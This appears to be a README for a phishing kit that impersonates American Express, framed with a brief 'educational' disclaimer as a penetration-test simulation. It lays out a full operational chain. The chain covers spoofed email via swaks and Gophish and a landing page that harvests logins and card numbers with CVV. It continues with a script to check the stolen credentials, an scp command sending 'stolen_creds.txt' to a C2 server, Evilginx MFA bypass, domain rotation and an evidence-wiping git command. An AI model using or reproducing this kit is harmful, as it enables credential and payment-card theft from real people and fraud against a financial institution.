# Amex-security-verify
# This repository is designed to simulate a real live threat actor based phishing campaign attempt
# These tools will be prohibited to use only within the written legal parameters of the tests scope
# DO NOT USE THIS FOR ANYTHING UNETHICAL OR ILLEGAL
# THIS IS FOR EDUCATIONAL AND PROFESSIONAL USE ONLY

–---------------------------------------–------------------------------------------------------------------
ENGAGEMENT ATTACK CHAIN STEPS:	


1. Target List Creation
   $ nano targets.csv
   email,first_name,last_name
   john.doe@targetcorp.com,John,Doe
   jane.smith@targetcorp.com,Jane,Smith

2. Verify Landing Page
   $ curl -I https://username.github.io/amex-security-verify/
   # Should return 200 OK
   
3. Test Harvest
   - Visit https://username.github.io/amex-security-verify/
   - Submit test: user=test@test.com pass=test123
   - Check: https://github.com/username/amex-security-verify/blob/main/logs.txt

4. GitHub Actions Email (Single Target)
   - Repo → Actions → "Send Phishing Emails" → Run workflow
   - Input: john.doe@targetcorp.com
   - Monitor: Actions log (real-time delivery)

5. Bulk Campaign (Gophish Local - Free)
   $ ./gophish
   # Dashboard: https://127.0.0.1:3333
   - New Sending Profile → Mailgun/Yandex SMTP
   - New Landing Page → https://username.github.io/amex-security-verify/
   - New Email Template → amex_phish.html (URL=landing)
   - New Campaign → targets.csv → LAUNCH

6. Manual Swaks (Emergency)
   $ swaks --to victim@target.com --from security@americanexpress.com \
   --server smtp.yandex.ru:465 --auth LOGIN --auth-user your@yandex.com \
   --auth-password yandexpass --html --body amex_phish.html

7. Attack Dashboard (Multi-Tail)
   $ tmux new -s phish
   Ctrl+B %  # Split
   # Window 1: Repo logs
   $ watch 'curl https://raw.githubusercontent.com/username/amex-security-verify/main/logs.txt | tail -20'
   
   # Window 2: GitHub traffic
   $ curl -s https://api.github.com/repos/username/amex-security-verify/traffic | jq
   
   # Window 3: Gophish
   $ ./gophish  # Or browser: localhost:3333

8. Expected Data Flow
   Victim opens → track.php hit (tracks.txt)
   Victim clicks → index.php step 1 logged
   Victim submits login → step 2 card page
   Victim submits card → harvest.php → logs.txt → REAL AMEX REDIRECT

9. Parse Harvested Creds
   $ curl -s https://raw.githubusercontent.com/username/amex-security-verify/main/logs.txt | grep -A20 "HARVESTED" | jq .  # If JSON
   
10. Test Credentials (Selenium/Automated)
    $ python3 validate.py  # Script below
    
11. Exfil (Secure Copy)
    $ curl -s https://raw.githubusercontent.com/username/amex-security-verify/main/logs.txt > stolen_creds.txt
    $ scp stolen_creds.txt your_c2_server:/loot/

12. MFA Bypass (Evilginx2)
    $ ./evilginx -phishlet amex -url https://username.github.io/amex-security-verify/
    
13. Domain Fronting (Scale)
    - New GitHub repo → New Pages URL
    - Rotate: github.io/user2-phish → user3-phish

14. Report Generation
    $ cat logs.txt | grep -E "(username|card_number|cvv)" > pentest_report.txt

–---------------------------------------–--------------------------------------------------------------------

validate.py

import requests
creds = open('logs.txt').read()
for line in creds.split('===')[1:]:
    if 'username' in line:
        user = line.split('"username":"')[1].split('"')[0]
        passw = line.split('"password":"')[1].split('"')[0]
        # Test Amex login (customize)
        print(f"Testing {user}:{passw}")

–---------------------------------------–--------------------------------------------------------------------

# In case of emergency use immediate kill all command sequence below

$ git rm -rf . && git commit -m "CLEAN" && git push
# OR rename repo → Pages instantly 404s

